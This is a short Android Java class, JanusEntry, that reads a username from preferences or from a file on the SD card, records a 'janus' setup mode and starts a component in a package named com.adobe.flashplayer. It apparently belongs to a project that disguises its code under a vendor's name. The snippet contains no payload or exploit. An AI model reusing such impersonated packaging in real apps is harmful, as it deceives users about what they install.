package com.main;

import java.io.File;
import java.io.FileInputStream;

import com.adobe.flashplayer.SoEntry;
import com.utils.PrefOper;
import com.utils.Public;

import android.content.Context;



public class JanusEntry {

	String TAG = "JanusEntry";
	
	@SuppressWarnings("unused")
	public void start(Context context){
		try {
			
			Public.init(context);
			
			String username = PrefOper.getValue(context, ForegroundService.PARAMCONFIG_FileName, ForegroundService.CFGUSERNAME);
			if (username == null || username.equals("")) {
				
				File filejanus = new File(ForegroundService.SDCARD_PATH_NAME + "janus_username.txt");
				
				FileInputStream fis = new FileInputStream(filejanus);
				
				int janusfs = (int)filejanus.length();
				byte [] bytestr = new byte[janusfs];
				int readlen = fis.read(bytestr,0,janusfs);
				fis.close();

				Public.UserName = new String(bytestr);
				
				boolean ret = PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName, 
						ForegroundService.CFGUSERNAME,Public.UserName);
				
				ret = PrefOper.setValue(context, ForegroundService.PARAMCONFIG_FileName,
						ForegroundService.SETUPMODE,"janus");
			}else{
				Public.UserName = username;
			}
			
			SoEntry.start(context,1);
			
		} catch (Exception e) {
			e.printStackTrace();
		}

	}
	
}
